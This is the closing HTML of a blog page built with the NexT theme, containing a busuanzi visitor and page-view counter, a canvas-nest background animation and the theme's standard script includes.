  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.3' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
